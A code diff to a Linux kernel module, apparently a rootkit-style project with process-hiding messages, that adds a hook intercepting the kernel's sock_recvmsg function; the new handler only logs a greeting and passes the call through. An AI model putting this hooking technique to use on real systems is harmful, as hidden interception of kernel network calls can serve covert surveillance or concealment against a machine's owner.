@@ -81,6 +81,7 @@
  */
 LABEL(kernel_start)
 
+#include <linux/net.h>
 #include <linux/slab.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
@@ -99,6 +100,7 @@ struct pid_list_node {
     struct task_struct *task;
     struct pid_list_node *next;
 };
+typedef int (*ttr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
 
 /*
  * Function declarations.
@@ -132,6 +134,15 @@ extern const char *MSG_PID_HD(void);
 extern const char *MSG_PID_NF(void);
 extern const char *MSG_PID_NH(void);
 extern const char *MSG_KM_ERR(void);
+extern ttr_sock_recvmsg *tr_sock_recvmsg(void);
+
+/*
+ * Hooked function handlers.
+ */
+int my_sock_recvmsg(struct socket *sock, struct msghdr *msg, int flags) {
+    pinfo("hello from my_sock_recvmsg()!\n");
+    return (*tr_sock_recvmsg())(sock, msg, flags);
+}
 
 void pid_list_test(void) {
 	size_t i;
@@ -346,6 +357,7 @@ DPTR(f_kfree)
 DPTR(f_find_vpid)
 DPTR(f_vscnprintf)
 DPTR(f_sys_write)
+DPTR(tr_sock_recvmsg)
 
 /*
  * Strings.
